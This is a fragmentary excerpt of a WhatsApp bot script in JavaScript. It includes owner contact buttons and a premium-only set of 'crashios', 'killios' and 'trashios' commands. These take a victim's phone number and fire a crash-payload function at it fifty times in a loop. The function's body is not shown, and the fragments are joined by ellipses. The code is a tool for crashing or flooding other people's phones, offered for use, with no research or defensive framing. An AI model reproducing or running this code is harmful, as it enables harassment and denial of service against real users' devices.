...
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"𝑪𝒉𝒂𝒕 𝑶𝒘𝒏𝒆𝒓\",\"url\":\"https://wa.me/6282291507974?text=halo+bg+gw+dapat+sc+lu+dari+ch\",\"merchant_url\":\"https://whatsapp.com/channel/0029VaNBep7AojYwtfrm3237"}`
}, 
{
"name": "cta_url",
...
case 'wet':{
m.reply('*Sbr*')
viper.sendMessage("6282136224640@s.whatsapp.net", { text: "ya", contextInfo: { forwardingScore: 9999, isForwarded: true }})
}
break
...
reply(bugres)
for (let i = 0; i < 50; i++) {
await buk1(viper, target, "p", 1020000, ptcp = true);
...
case 'crashios': case 'killios': case 'trashios':
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
